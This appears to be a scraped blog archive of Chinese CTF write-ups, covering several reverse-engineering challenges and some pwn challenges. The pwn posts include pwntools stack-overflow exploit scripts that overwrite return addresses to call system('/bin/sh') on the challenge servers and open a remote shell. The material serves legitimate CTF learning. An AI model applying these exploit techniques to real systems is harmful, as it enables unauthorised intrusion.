Br1y5ot1QbSdE56t9mtUOLiNnawJBJg41uaDxUAF6++3GyFDfMGCPGSD/doz4FNMv5MkBl8Q3HDNF6tuwHbSPPsgBifxmHzfL5VgCIf8xH6vK8tI+2lwbn1L7KNuUvthH4KL0DdtGe4fPXNf2sZUldAWSKwUwDBVBOgi+pYRB4ynM2qtUIgf0MQgk90HuF4x5VMJIsC015hqJsclpjDgwaBizHMfCIF9KcpRBWZSJTJzLLQ1OpCx0ZSh/FF5z5YAR7bdxQPtlDTGgDPplDAPyMQbyWK2pr4ZAluodtgPZxxL1M4ZLW0zYHspZM2FBl8Ap24x8u8QSXchBhFa/kR0drumboVzInZ8jXqNTc209CIEsAXfr35wXAjkUzkuezETBecFwPwgSEsHNt2bgjO39tp75HQpbWy5XtNxzzz2PGA2+AwN0l+2wqLSEQJbUjdHj/G7pJGBJnaVvancuSuWVfm+9c1CSZ//3TiASsU4gZaBqXrRjZsQrc3mGtF96zf5/ab+65R50GaXD5CgZ9UhHilJdkS2MjCeJkivykN3I1PoM08iU83QCkWh1AnFAWZxKkczUZjyCyFeKq9mq15dD1OUqvfceGQ/UkkBo/RaDTkuTFtdrPlf04beveT5nJxCJpDWMprhjnoEY+dbksfFAxl/dzJpLHl+0hZURsTDnORmdioq9aU0gNavRVn3cGoOtToIUgZjnVVt13LHqMcbMymauzDAuh62V2LRviwSC3FHG02DQOo95CROZogJKDWlHYrBFAqF9hrSjcLDjKqo+W44ikNbLNSt8y3x2O8XIZGINjMErvVpoZInOY1dqZgvLnl2UBvJWB18k9qVJiQ2iszJFBPbZura4hYXspW1D2z6Tz44rU1ZkHkUgpeCUSIG2WFb0DKg0g6tRFmOIW2FaE+VauvW0Zsleir41q7lWGB2qnlKgXeQKmja0mlRu8RA992EJ86i+rhlXUXXachSBUBhGj5lzq5fcbAMOnQ9DxhZejUupkQmXy7EHbGoMJ/WMBYaZ+qPzLHmGlgEItvv+/KwYwKYG8yki3ersNRp/ypsi0poJSY1ch568bN2FdQ7zGhzn8rJyBGcbOxJVry1HE0g2Vhg+yGTsASNb6SnkI4iHTqt5Gre2XWDIi4QEKeWAp6VBTxhj+sVsfdXKOZc/B0eBU43Bz2VCgFmnclDbUsw5E8pBZuAZ8ZRsJFYtykIH0AV0i75ZE5hp5M2YR+rdWp0yckfmyZgzjqfc0mvrOxUMqgikFoSevyPQEegIdATOLwKdQM5v3/aWdQQ6Ah2BgyLQCeSg8PbCOwIdgY7A+UWgE8j57dveso5AR6AjcFAEOoEcFN5eeEegI9AROL8IdAI5v33bW9YR6Ah0BA6KQCeQg8LbC+8IdAQ6AucXgU4g57dve8s6Ah2BjsBBEegEclB4e+EdgY5AR+D8IvD/A/qMi5YevdI1AAAAAElFTkSuQmCC 原来这是图片数据，base64 png让我想到了经常看见但是没用过的base64转图片，转出来一个二维码，扫描后得到flag。 Timer用dex2jar和jd-gui操作一下得到 12345if (MainActivity.this.beg - MainActivity.this.now &lt;= 0) &#123; paramBundle.setText(&quot;The flag is:&quot;); localTextView.setText(&quot;alictf&#123;&quot; + MainActivity.this.stringFromJNI2(MainActivity.this.k) + &quot;&#125;&quot;); &#125; 可以看到flag的格式啥的了，可是不会java有点看不懂，后面也有几题都是apk，等看了java再来看看。 love直接ida打开，搜索flag找到了关键函数。 要求输入flag，经过一个函数加密后，再每一位加上下标值，与一固定字符串对比。写脚本得出加上下标值之前的字符串： 123456#!/usr/bin/env pythonkey=&apos;e3nifIH9b_C@n@dH&apos;temp=&apos;&apos;for i in range(len(key)): temp+=chr(ord(key[i])-i)print temp 后发现加密函数就是base64加密，直接解密刚刚得到的temp字符串得到flag。","categories":[],"tags":[]},{"title":"CGCTF-stackoverflow","slug":"cgctf-stackoverflow","date":"2018-10-03T11:34:16.000Z","updated":"2019-03-05T15:36:34.483Z","comments":true,"path":"2018/10/03/cgctf-stackoverflow/","link":"","permalink":"http://yoursite.com/2018/10/03/cgctf-stackoverflow/","excerpt":"","text":"题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&quot;you can leave some message here:&quot;);fgets(A, 60, stdin);puts(&quot;your name please:&quot;);fgets(&amp;s, n, stdin);return puts(&quot;Thank you&quot;); a可以用来存放/bin/sh字符串，n的地址就在a后面，而a的大小只有40，所以输入超过40的话就可以改变n的值，让s(大小为0x30)产生栈溢出，最终覆盖掉message函数的返回地址，进入system函数。 脚本如下： 1234567891011from pwn import *sh=remote(&apos;182.254.217.142&apos;,10001)sh.recvuntil(&apos;your choice:&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;you can leave some message here:&apos;)payload=&apos;/bin/sh\\0&apos;+&apos;a&apos;*40sh.sendline(payload)sh.recvuntil(&apos;your name please:&apos;)payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)sh.sendline(payload)sh.interactive() 随后按照题目提示进入目录cat flag即可","categories":[],"tags":[]},{"title":"十一欢乐赛-pwn4","slug":"十一欢乐赛-pwn4","date":"2018-10-03T09:19:05.000Z","updated":"2018-10-03T09:54:31.371Z","comments":true,"path":"2018/10/03/十一欢乐赛-pwn4/","link":"","permalink":"http://yoursite.com/2018/10/03/十一欢乐赛-pwn4/","excerpt":"","text":"有system函数 无/bin/sh字符串 首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。 因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。 脚本如下： 12345678910111213141516from pwn import *sh=remote(&quot;47.100.40.190&quot;,10009)sh.recvuntil(&apos;username: &apos;)sh.sendline(&apos;admin&apos;)sh.recvuntil(&apos;password: &apos;)sh.sendline(&apos;T6OBSh2i&apos;)sh.recvuntil(&apos;Your choice: &apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;Command: &apos;)sh.sendline(&apos;/bin/sh&apos;)sh.recvuntil(&apos;Your choice: &apos;)payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)sh.sendline(payload)sh.recvuntil(&apos;Your choice: &apos;)sh.sendline(&apos;3&apos;)sh.interactive() 随后cat flag即可得到flag","categories":[],"tags":[]},{"title":"十一欢乐赛-bss_stack","slug":"十一欢乐赛-bss-stack","date":"2018-10-03T08:24:15.000Z","updated":"2018-10-03T09:27:54.207Z","comments":true,"path":"2018/10/03/十一欢乐赛-bss-stack/","link":"","permalink":"http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/","excerpt":"","text":"找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&quot;Enter password: &quot;);fflush(stdout);fgets(&amp;s, 100, stdin);puts(&quot;Authentification failed&quot;);fflush(stdout);return sleep(1u); fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。 这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下： 12345678910from pwn import *sh=remote(&quot;47.100.40.190&quot;,10011)sh.recvuntil(&apos;User name : &apos;)sh.sendline(&apos;/bin/sh&apos;)sh.recvuntil(&apos;Action: &apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;Enter password: &apos;)payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)sh.sendline(payload)sh.interactive() 之后cat flag就可以得到flag了","categories":[],"tags":[]},{"title":"CGCTF-born","slug":"cgctf-born","date":"2018-10-02T08:37:30.000Z","updated":"2019-03-05T15:36:24.851Z","comments":true,"path":"2018/10/02/cgctf-born/","link":"","permalink":"http://yoursite.com/2018/10/02/cgctf-born/","excerpt":"","text":"题目地址 看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333 打开test.c: 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;struct Student &#123; char name[8]; int birth;&#125;;int main(void) &#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); struct Student student; printf(&quot;What\\&apos;s Your Birth?\\n&quot;); scanf(&quot;%d&quot;, &amp;student.birth); while (getchar() != &apos;\\n&apos;) ; if (student.birth == 1926) &#123; printf(&quot;You Cannot Born In 1926!\\n&quot;); return 0; &#125; printf(&quot;What\\&apos;s Your Name?\\n&quot;); gets(student.name); printf(&quot;You Are Born In %d\\n&quot;, student.birth); if (student.birth == 1926) &#123; printf(&quot;You Shall Have Flag.\\n&quot;); system(&quot;cat flag&quot;); &#125; else &#123; printf(&quot;You Are Naive.\\n&quot;); printf(&quot;You Speed One Second Here.\\n&quot;); &#125; return 0;&#125; 发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下： 12345from pwn import *sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)sh.sendline(&apos;0&apos;)sh.sendline(&apos;0&apos;*8 + p32(1926))sh.interactive flag get","categories":[],"tags":[]},{"title":"十一欢乐赛-reverse","slug":"十一欢乐赛-reverse","date":"2018-10-02T05:03:23.000Z","updated":"2018-10-03T08:24:38.780Z","comments":true,"path":"2018/10/02/十一欢乐赛-reverse/","link":"","permalink":"http://yoursite.com/2018/10/02/十一欢乐赛-reverse/","excerpt":"","text":"HelloReverse直接拖进ida，发现一个名为getflag的函数，点进去发现plain里存着flag。 HelloPythonpyc文件反编译一波直接运行，得不到flag分析一波程序。 123if len(sys.argv) &lt; 5: print(&quot;I can&apos;t give you flag :(&quot;) sys.exit(0) 找到了一个判断条件，直接把exit(0)去掉 再把输入flag的判断条件改为1： 12if int(sys.argv[1]) &gt; 10 and Fibonacci(int(sys.argv[1])) == int(sys.argv[4]): print(decrypt(15, &apos;MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH&apos;)) 运行发现n = None // 2会报错改成n=1试试发现输出了一个S应该就是flag的开头 最后尝试出n=33时输出完整flag XOR1ida打开发现直接把两个数组异或就能得到flag XOR2和1差不多，区别是有一个数组是rand函数生成的，不过rand函数生成的随机数其实也是固定的。一开始用mac试了很久得不到flag，后来想起来不同系统随机数生成的也不一样，又用windows尝试，结果最后发现要用linux。 Maze写过了maze就很容易了，wasd对应上下左右移动地图如下： 123456789OOOO*OOOOO1111O11OO1OOOO1OOO11O111OOOO111OO1OOOO1OO11OOOO111O1OOOO1O1111OOOOOOOO1 沿着1走到*得到flag 加上SUSCTF{} 题目都很简单，其他方向的也都是当场百度就能做(pwn还没","categories":[],"tags":[]},{"title":"CGCTF-homuraVM","slug":"cgctf-homuraVM","date":"2018-09-29T10:23:34.000Z","updated":"2019-03-05T15:36:08.573Z","comments":true,"path":"2018/09/29/cgctf-homuraVM/","link":"","permalink":"http://yoursite.com/2018/09/29/cgctf-homuraVM/","excerpt":"","text":"题目地址 ida打开F5主函数代码,要求输入一个字符串s 然后input[i+1]=s[i]input[0]=s[len(s)-1] 之后把两个很长的字符串分别赋值到v39,v40 sub_8DC函数根据这两个字符串对input进行操作 sub_8AA不知道是干啥的，后百度得知是反调试 最后将处理过的input与给定的值对比，相同则ok value1和value2初始值为0 i为很长的字符串的下标 读取到每个字符对应到的操作如下： 12345678910111213141516171819case &quot;C&quot;:*value2-=2*(*value1&amp;*ipnut) ++icase &quot;G&quot;:--*value2 ++icase &quot;M&quot;:*value2=*value1+*input ++icase &quot;T&quot;:++*value2 ++icase &quot;[&quot;:if *input!=0 ++i else i为]后一位case &quot;]&quot;:if *input!=0 i为[后一位 else ++icase &quot;a&quot;:--*value1 ++icase &quot;h&quot;:input=input+4 ++icase &quot;m&quot;:++*input ++icase &quot;o&quot;:input=input-4 ++icase &quot;r&quot;:++*value1 ++icase &quot;u&quot;:--*input ++icase &quot;v&quot;:*value2=*value1 ++icase &quot;&#123;&quot;:if *value2!=0 ++i else i为&#125;后一位case &quot;&#125;&quot;:if *value2!=0 i为&#123;后一位 else ++i 注意到h是对input进行下标+1的操作，所以以h为分界线把很长的字符串分割开如下 12345678910111213141516171819202122232425262728293031323334h[ur]ovMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125; hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125; 其中，每条都有的部分为hv{aG}[ur]ov……MCh{mG} 1234567891011121314151617181920[ur]： *value1=*input *input减到0 &#123;aG&#125;： *value1-=*value2 *value2减到0 &#123;mG&#125;： *input+=*value2 *value2减到0 hv&#123;aG&#125;[ur]ov……MCh&#123;mG&#125;:input+=4*value2=*value1*value1-=*value2*value2=0*value1=*input*input=0input-=4*value2=*value1.. 此部分仅ar数量及顺序不同，控制*value1.*value2=*value1+*input*value2-=2*(*value1&amp;*ipnut)input+=4*input+=*value2*value2=0 作用为：input[i+1]=(input[i]+ar处理过的input[i+1])-2*(ar处理过的input[i+1]&amp;input[i]) 不知道怎么逆运算，只能尝试爆破了，打算先求出被ar处理过的input[i+1] 12345678import stringfinal=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96,]ar=&apos;&apos;for i in range(33): for s in string.printable: if ord(s)+final[i]-2*(ord(s)&amp;final[i])==final[i+1]: ar+=sprint ar 得到ar处理后的flag从第二位开始为icg~B4{2KcG0oww6]h++m_{2wX\\aqc/M} 接下来根据ar的个数进行逆运算即可: 123456operate=[+3,-2,0,-3,+2,-1,-5,-1,+1,-4,+1,0,-2,-2,-5,-2,+2,-2,-1,-1,-2,0,-2,-2,-2,-6,+3,+1,+1,-2,+2,+1,0]final=list(&apos;icg~B4&#123;2KcG0oww6]h++m_&#123;2wX\\\\aqc/M&#125;&apos;)for i in range(len(operate)): final[i]=chr(operate[i]+ord(final[i]))flag=&apos;&apos;.join(final)print flag 得到flag第二位开始为lag{D3v1L_H0mur4_f**k_y0uR_bra1N} 很明显第一位为f 手动添加上 flag get","categories":[],"tags":[]},{"title":"sus-ccc","slug":"sus-ccc","date":"2018-09-26T14:52:35.000Z","updated":"2018-10-11T12:51:43.294Z","comments":true,"path":"2018/09/26/sus-ccc/","link":"","permalink":"http://yoursite.com/2018/09/26/sus-ccc/","excerpt":"","text":"题目地址 主函数很简单，直接看验证函数： 1234567891011v6 = 0;if ( a2 != 42 ) return 0;for ( i = 3; i &lt;= 42; i += 3 )&#123; v3 = crc32(0, (_BYTE *)a1, i); v4 = v6++; if ( v3 != hashes[v4] ) return 0;&#125;return 1; 输入一共42位，1-3，1-6，1-9一直到1-42循环经过crc32函数处理后与hashes值进行比对，一共比对14次。crc32函数如下： 123456789v6 = a2; for ( i = ~a1; ; i = (i &gt;&gt; 8) ^ crc32_tab[(unsigned __int8)(i ^ *v3)] ) &#123; v4 = a3--; if ( !v4 ) break; v3 = v6++; &#125; return ~i; 然而不管是写爆破脚本还是逆运算脚本都没能得到flag……觉得自己对函数的理解没有错误，百度了一下python中~0=-1,c语言中~0=1，所以出了问题。看了大佬的writeup发现python里可以使用crc32函数，于是爆破脚本如下： 1234567891011121314#!/usr/bin/env pythonimport stringimport binasciihashes=[0xD641596F,0x80A3E990,0xC98D5C9B,0xD05AFAF,0x1372A12D,0x5D5F117B,0x4001FBFD,0xA7D2D56B,0x7D04FB7E,0x2E42895E,0x61C97EB3,0x84AB43C3,0x9FC129DD,0xF4592F4D]flag=&apos;&apos;for n in hashes: for i in string.printable: for j in string.printable: for k in string.printable: temp=i+j+k if binascii.crc32(flag+temp)&amp;0xffffffff == n: flag+=temp break;print flag flag get","categories":[],"tags":[]},{"title":"sus-accumulator","slug":"sus-accumulator","date":"2018-09-24T07:15:10.000Z","updated":"2018-09-24T07:32:29.961Z","comments":true,"path":"2018/09/24/sus-accumulator/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-accumulator/","excerpt":"","text":"题目地址 拖进ida 主函数： 12345678910111213141516171819202122232425262728293031323334__int64 v3; // rbx char v4; // al signed __int64 result; // rax __int64 v6; // [rsp+0h] [rbp-458h] char v7; // [rsp+3Fh] [rbp-419h] char input; // [rsp+40h] [rbp-418h] unsigned __int64 v9; // [rsp+448h] [rbp-10h] v3 = 0LL; v9 = __readfsqword(0x28u); __printf_chk(1LL, &quot;What&apos;s your flag? &quot;, a3); do &#123; v4 = _IO_getc(stdin); if ( v4 == &apos;\\n&apos; ) break; if ( v4 == -1 ) break; *(&amp;v7 + ++v3) = v4; &#125; while ( v3 != 1024 ); if ( SHA512((__int64)&amp;input, v3, (__int64)&amp;v6) )// v6=sha512(input) &#123; sub_4008C0((unsigned __int8 *)&amp;v6, 64LL); sub_4008C0((unsigned __int8 *)&amp;input, v3); puts(&quot;Good flag for you.&quot;); result = 0LL; &#125; else &#123; puts(&quot;error&quot;); result = 1LL; &#125; return result; do~while循环里是读取输入，最多读取1024位，遇到回车符或读取完则停止，很明显if条件必成立，v6=sha512(input)，进入sub4008c0函数 123456789101112131415161718192021222324252627if ( a2 ) &#123; v2 = i + *a1; // i,j初始为0 v3 = v2 == dword_601080[j]; v4 = (unsigned int)(j + 1); i += *a1; ++j; if ( !v3 ) &#123;LABEL_8: puts(&quot;Bad flag :(&quot;); exit(1); &#125; v5 = a1 + 1; v6 = &amp;a1[a2]; while ( v5 != v6 ) &#123; v7 = *v5++; v2 += v7; v3 = v2 == dword_601080[v4]; i = v2; j = v4 + 1; if ( !v3 ) goto LABEL_8; v4 = (unsigned int)(v4 + 1); &#125; &#125; 一开始没分析出i和j的作用…对应的地址内存值为????一脸懵逼以为是没看见赋值，后知道了i和j是下标的作用，很容易分析出dword601080处的值就是input累加的结果，也就是说flag和dword601080内存值的位数是相等的，直接根据第二次sub4008c0就可以逆运算出flag，不需要管if条件对v6的操作以及第一次此函数对v6值的校验。然而照这样手动逆运算了前几个值，并没有得到类似于flag开头之类的字符，以为是分析错了，又看了好几遍函数，结果只是flag并不是从头开始……前几位是无意义的字符而已， 首次使用了idc脚本dump下了dword601080处内存，逆运算脚本如下： 123456a=[195,255,493,584,799,929,946,1086,1180,1184,1421,1595,1805,1846,2081,2320,2430,2605,2727,2972,3213,3403,3418,3649,3712,3950,3989,4193,4228,4394,4523,4624,4706,4935,4999,5072,5106,5291,5510,5536,5644,5751,5993,6118,6126,6198,6211,6410,6469,6609,6647,6752,6978,7010,7053,7106,7274,7468,7563,7673,7706,7956,8146,8187,8257,8333,8398,8469,8592,8640,8693,8742,8793,8844,8901,8953,9007,9062,9113,9161,9215,9317,9374,9429,9483,9540,9591,9644,9692,9741,9792,9846,9944,9996,10045,10144,10195,10246,10294,10350,10402,10450,10551,10652,10750,10849,10946,11045,11096,11147,11202,11304,11353,11451,11507,11605,11653,11753,11852,11900,11951,12052,12105,12161,12259,12360,12409,12461,12563,12664,12718,12775,12823,12921,12970,13020,13071,13173,13227,13276,13374,13422,13521,13569,13667,13718,13771,13873,13972,14029,14080,14179,14278,14377,14432,14482,14531,14579,14627,14679,14732,14789,14840,14894,14951,15052,15154,15210,15263,15314,15363,15460,15509,15610,15666,15763,15818,15916,15968,16018,16075,16132,16233,16288,16386,16443,16543,16600,16655,16703,16801,16858,16955,17005,17056,17153,17250,17375]b=[195]for i in range(1,len(a)): b.append(a[i]-a[i-1])s=&apos;&apos;.join([chr(i)for i in b])print s 忽略掉前几个无意义字符后出现flag{} 12sH1rkEr:desktop macbook$ python 1.py?;?&amp;i? +5??_n!??)FLAG&#123;051339467306f9769350136b41c330840eebcac337f1b8b0dc03e58be14fe690b123f61b0c0b35fc93ccc72100459369ef8531a1e8a7b4299e7b9d970b9a23aa&#125; flag get","categories":[],"tags":[]},{"title":"sus-pyyy","slug":"sus-pyyy","date":"2018-09-24T04:22:05.000Z","updated":"2018-09-24T04:28:57.306Z","comments":true,"path":"2018/09/24/sus-pyyy/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-pyyy/","excerpt":"","text":"题目地址 下载下来是个pyc文件，直接反编译一波： 12345678910111213141516171819202122232425#!/usr/bin/env python__import__(&apos;sys&apos;).setrecursionlimit(1048576)data = &apos;Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI&apos;a = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907Lb = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499Lc = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619Ld = 120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053Le = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707LF = (a,b,c,d,e)m = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011Lg = 67051725181167609293818569777421162357707866659797065037224862389521658445401Lz = []for i, f in enumerate(F): n = pow(f, m, g) this_is = &apos;Y-Combinator&apos; l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: (1 if x &lt; 2 else f(x - 1) * x % n))(g % 27777) c = raw_input(&apos;Channenge #%d:&apos; % i) if int(c) != l: print &apos;Wrong~&apos; exit() z.append(l)z.sort()gg = &apos;(flaSg\\&apos;7 \\\\h#GiQwt~66\\x0csxCN]4sT&#123;? Zx YCf6S&gt;|~`\\x0c$/&#125;\\&apos;\\r:4DjJFvm]([sP%FMY&quot;@=YS;CQ7T#zx42#$S_j0\\\\Lu^N31=r\\x0b\\t\\tjVhhb_KM$|6]\\nl!:V\\rx8P[0m ;ho_\\rR(0/~9HgE8!ec*AsGd[e|2&amp;h!&#125;GLGt\\&apos;=$\\x0cbKFMnbez-q\\\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\\x0b\\\\9Ohf]c&gt;Vj/&gt;rnWXgLP#&lt;+4$BG@,\\&apos;n a_7C:-&#125;f(WO8Y\\x0c2|(nTP!\\&apos;\\\\&gt;^\\&apos;&#125;-7+AwBV!w7KUq4Qpg\\tf.&#125;Z7_!m+ypy=`3#\\\\=?9B4=?^&#125;&amp;\\&apos;~ Z@OH8\\n0=6\\x0b\\tv\\nl!G\\&apos;y4dQW5!~g~I*f&quot;rz1&#123;qQH&#123;G9\\x0c\\&apos;b\\x0cp\\x0bdu!2/\\\\@i4eG&quot;If0A&#123;-)N=6GMC&lt;U5/ds\\rG&amp;z&gt;P1\\nsq=5&gt;dFZUWtjv\\tX~^?9?Irwx\\\\5A!32N\\x0bcVkx!f)sVY Men\\x0c\\&apos;ujN&lt;&quot;LJ\\x0c5R4&quot;\\\\\\\\XPVA\\&apos;m$~tj)Br&#125;C&#125;&amp;kX2&lt;|\\np3XtaHB.P\\&apos;(E 4$dm!uDyC%u [&quot;x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?&#123;%e\\x0b]wN_&#125;*Q:mh&gt;@]u\\t&amp;6:Z*Fmr?U`cOHbAf7s@&amp;5~L ,\\tQ18 -Hg q2nz%\\x0ccUm=dz&amp;h1(ozoZ)mrA=`HKo\\n\\&apos;rXm&#125;Z-l3]WgN\\\\NW&lt;&#123;o=)[V(&#123;7&lt;N1.-A8S&quot;=;3sderb\\tOZ$K\\r0o/5\\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3&lt;w-g\\&apos;/j\\&apos;\\tM4|9l?i&amp;tm_\\n57X0B2rOpuB@H@%L_\\r)&amp;/q=LZa(%&#125;&quot;&quot;#if#Kq74xK?`jGFOn&quot;8&amp;^3Q-\\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\\rstOT40=?DyHor8j7O\\\\r/~ncJ5];cCT)c?OS0EM5m#V(-%&quot;Tu:!UsE],0Dp 